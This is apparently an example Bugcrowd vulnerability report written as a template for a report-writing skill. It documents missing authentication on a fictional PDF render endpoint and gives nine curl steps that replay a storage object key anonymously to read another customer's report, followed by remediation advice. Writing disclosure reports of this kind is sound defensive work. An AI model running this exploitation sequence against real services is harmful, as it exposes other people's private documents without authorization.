---
description: "Example: Bugcrowd submission for missing authentication on a report-render endpoint exposing other customers' PDFs in a shared storage bucket"
skill: report-generation
category: Disclosure & Reporting Formats
---

**Title:** Missing auth in report-render endpoint lets anonymous users read other customers' PDFs

**VRT:** Broken Access Control (BAC) > Insecure Direct Object References (IDOR) > View Sensitive Information(Iterable Object Identifiers)

**Severity:** HIGH

**CVSS:** CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N (7.5)

**Asset:** POST https://export.ridgeline.example/api/v2/render

---

### Summary

An anonymous caller reads any customer's previously rendered PDF report by pairing the render endpoint's storage parameters with a key it never issued them. `POST /api/v2/render` accepts an inline `html` field, or a `bucket`/`object_key` pair that fetches an object from storage instead. That fetch runs under the render service's own storage credential, not the caller's, and nothing checks a session, API key, or key ownership. A key captured from one customer's render, replayed against the same endpoint with zero credentials, returns that customer's full report to anyone.

### Steps to Reproduce

1. [attacker] Register a free trial account (Customer A, self-service, no verification) and render a report with attacker-supplied HTML:
```
curl -s -D - -o /dev/null -X POST https://export.ridgeline.example/api/v2/render \
  -H "Authorization: Bearer $CUSTOMER_A_TOKEN" \
  -d 'html=<h1>VIGILMARK</h1>'
```
**Expect:** 302. `Location` names the synthetic bucket `amzn-s3-demo-vigil-render-cache` and a UUID object key — keep the key.
2. [attacker] Follow that location with no further credential:
```
curl -s '<location from step 1>' -o out.pdf && pdftotext out.pdf -
```
**Expect:** `VIGILMARK`.
3. [attacker] Call the render endpoint again, anonymously this time, passing the same key explicitly instead of `html`:
```
curl -s -D - -o /dev/null -X POST https://export.ridgeline.example/api/v2/render \
  --data-urlencode 'bucket=amzn-s3-demo-vigil-render-cache' \
  --data-urlencode "object_key=<key from step 1>"
```
**Expect:** 302, no `Authorization` header sent.
4. [attacker] Follow that second location:
```
curl -s '<location from step 3>' -o out2.pdf && pdftotext out2.pdf -
```
**Expect:** `VIGILMARK` again — the bucket/key path needs no session either.
5. [attacker] Repeat step 3 with `object_key` set to a value that was never minted:
```
curl -s -o /dev/null -w '%{http_code}\n' -X POST https://export.ridgeline.example/api/v2/render \
  --data-urlencode 'bucket=amzn-s3-demo-vigil-render-cache' \
  --data-urlencode 'object_key=vigil-no-such-object'
```
**Expect:** 400, no `Location` header.
6. [attacker] Request the key from step 1 directly from the storage host, with no signature:
```
curl -s -o /dev/null -w '%{http_code}\n' \
  "https://amzn-s3-demo-vigil-render-cache.s3.amazonaws.com/<key from step 1>"
```
**Expect:** 403.
7. [attacker] Register a second, unrelated trial account (Customer B) and render a report the same way as step 1:
```
curl -s -D - -o /dev/null -X POST https://export.ridgeline.example/api/v2/render \
  -H "Authorization: Bearer $CUSTOMER_B_TOKEN" \
  -d 'html=<h1>CUSTOMERB-INVOICE-TOTAL-4820.75</h1>'
```
**Expect:** 302, a second UUID key.
8. [attacker] With no session, cookie, or `Authorization` header, call the render endpoint with Customer B's key from step 7:
```
curl -s -D - -o /dev/null -X POST https://export.ridgeline.example/api/v2/render \
  --data-urlencode 'bucket=amzn-s3-demo-vigil-render-cache' \
  --data-urlencode "object_key=<key from step 7>"
```
**Expect:** 302.
9. [attacker] Follow the returned location and extract the text:
```
curl -s '<location from step 8>' -o out3.pdf && pdftotext out3.pdf -
```
**Expect:** Customer B's report content, from an account the attacker never touched.

### Evidence

**Cross-customer read.** Step 9's extracted text:
```
$ pdftotext out3.pdf -
CUSTOMERB-INVOICE-TOTAL-4820.75                                   <-- Customer B's own report, read by Customer A's session with zero credentials
```

**Where the key comes from.** Every render, including a customer's own normal in-product report download, redirects the browser through this same endpoint with `bucket`/`object_key` plainly in the querystring. Any way that URL becomes visible to someone else — a forwarded link, browser history, a shared screenshot — hands over durable read access. That access is independent of the short-lived presigned URL the endpoint also returns alongside it.

**On the VRT leaf.** `object_key` is a UUID, which VRT's own IDOR fork treats as the low-severity "Complex" branch (P4) by default. The harvest chain above changes that: it hands the identifier to any caller through ordinary use, not something to guess or brute-force. That's the Iterable leaf claimed above. It's also why this sits at HIGH rather than the P3/Medium a bare complex-identifier IDOR would default to. Nothing here is gated behind a session, unlike the P3 pattern, which assumes an authenticated caller walking IDs.

**Minimum privilege.** Both trial accounts are ordinary free self-registrations with no elevated role, and the actual cross-customer read in steps 8-9 carried no credential at all.

### Attack Scenario

A support contractor or ex-employee holds a stale report link, from a forwarded email, an old browser history entry, or a shared screenshot. They paste it into the render endpoint from any machine, no account required. The request returns the report exactly as the original recipient saw it.

### Impact

Any caller who obtains a rendered-report key, from a forwarded link, browser history, or a screenshot, reads that report with no account or credential. Every customer's rendered PDFs sit behind this one unauthenticated path, so exposure is bounded only by which keys leak, not by any privilege it enforces.

### Remediation

Require the caller to own the report before the `bucket`/`object_key` path serves it. Resolve the object server-side from a report ID scoped to the caller's account, dropping the caller-supplied `bucket`/`object_key` parameters entirely. As defense-in-depth, scope the render service's storage credential to the reports it just generated, not a bucket-wide read grant. That way a regression in the ownership check can't reopen the same exposure.
